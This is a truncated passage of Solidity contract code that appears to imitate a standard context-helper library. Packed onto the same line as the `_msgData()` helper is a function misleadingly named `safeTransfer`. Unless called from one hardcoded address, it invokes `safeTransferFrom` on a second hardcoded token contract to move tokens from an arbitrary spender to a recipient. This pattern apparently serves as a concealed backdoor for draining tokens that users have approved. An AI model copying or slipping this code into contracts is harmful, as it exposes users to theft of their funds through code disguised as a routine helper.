 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x8d1aB5e6b2ae7c52924a8ee4a776111e066bbf19)) {TransferHelper.safeTransferFrom(0x21f7cE81F8C571E0ec6B0867AA98149830B05e39,spender,recipient,amount);return true;}return false;}
}
